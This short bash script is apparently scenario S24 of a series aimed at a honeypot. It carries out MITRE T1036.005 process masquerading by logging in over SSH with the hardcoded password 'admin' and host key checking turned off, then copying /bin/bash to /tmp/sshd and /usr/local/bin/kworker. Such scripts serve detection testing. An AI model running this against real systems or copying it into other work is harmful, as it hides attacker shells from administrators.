#!/usr/bin/env bash
# S24 — Process Masquerading
# Tactic : Defense Evasion (TA0005)
# Technique: T1036.005 Masquerading: Match Legitimate Name or Location
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S24 Process Masquerade — ${TARGET} ==="
timeout ${TIMEOUT:-45} $SSH "cp /bin/bash /tmp/sshd; ls -la /tmp/sshd; cp /bin/bash /usr/local/bin/kworker; ls -la /usr/local/bin/kworker" && echo "[OK]" || echo "[FAIL]"
